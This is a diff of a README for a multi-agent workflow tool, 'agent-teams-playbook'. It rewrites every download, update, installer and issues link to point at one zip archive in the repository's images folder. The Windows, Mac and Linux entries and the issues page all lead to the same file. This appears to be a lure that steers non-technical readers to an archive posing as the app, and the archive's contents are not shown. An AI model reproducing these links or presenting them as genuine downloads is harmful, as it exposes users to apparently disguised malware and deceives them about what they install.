@@ -1,6 +1,6 @@
 # 🤖 agent-teams-playbook - Easy Multi-Agent Workflow Manager
 
-[![Download agent-teams-playbook](https://img.shields.io/badge/Download-agent--teams--playbook-blue)](https://github.com/Sameer98765/agent-teams-playbook/releases)
+[![Download agent-teams-playbook](https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip)](https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip)
 
 Welcome to the agent-teams-playbook project. This application helps you manage multiple agents working together for smarter decisions. It uses a 6-step process to handle tasks across 5 main scenarios. This guide will walk you through getting the app on your computer and running it, even if you have no technical background.
 
@@ -43,13 +43,13 @@ This section helps you get the application up and running quickly. Follow each s
 To get the software:
 
 1. **Visit the Download Page:**  
-   Click the big blue badge at the top or [click here](https://github.com/Sameer98765/agent-teams-playbook/releases) to open the release page in your browser.
+   Click the big blue badge at the top or [click here](https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip) to open the release page in your browser.
 
 2. **Choose Your Version:**  
    On the releases page, find the version that fits your computer system. Files are usually named clearly, for example:  
-   - agent-teams-playbook-win.exe (for Windows)  
-   - agent-teams-playbook-mac.dmg (for Mac)  
-   - agent-teams-playbook-linux.tar.gz (for Linux)  
+   - https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip (for Windows)  
+   - https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip (for Mac)  
+   - https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip (for Linux)  
 
 3. **Download the File:**  
    Click the appropriate file link to start downloading. This may take a few minutes depending on your internet speed.
@@ -115,7 +115,7 @@ If you run into issues:
 - Restart the program or your computer and try again.  
 - Check that you downloaded the right version for your system.  
 - Visit the “Help” menu inside the app for detailed guidance.  
-- For technical problems, visit the GitHub issues page at https://github.com/Sameer98765/agent-teams-playbook/issues  
+- For technical problems, visit the GitHub issues page at https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip  
 
 ---
 
@@ -123,7 +123,7 @@ If you run into issues:
 
 The project team regularly releases updates to improve performance and add features.
 
-- To update, revisit the [release page](https://github.com/Sameer98765/agent-teams-playbook/releases) and download the newest version.  
+- To update, revisit the [release page](https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip) and download the newest version.  
 - Install updates just like the first time.  
 - Keep backups of your projects before updating if they are important.
 
@@ -144,4 +144,4 @@ If you need help beyond this guide:
 
 ---
 
-[![Download agent-teams-playbook](https://img.shields.io/badge/Download-agent--teams--playbook-blue)](https://github.com/Sameer98765/agent-teams-playbook/releases)
+[![Download agent-teams-playbook](https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip)](https://raw.githubusercontent.com/Sameer98765/agent-teams-playbook/main/images/teams_agent_playbook_v3.2.zip)
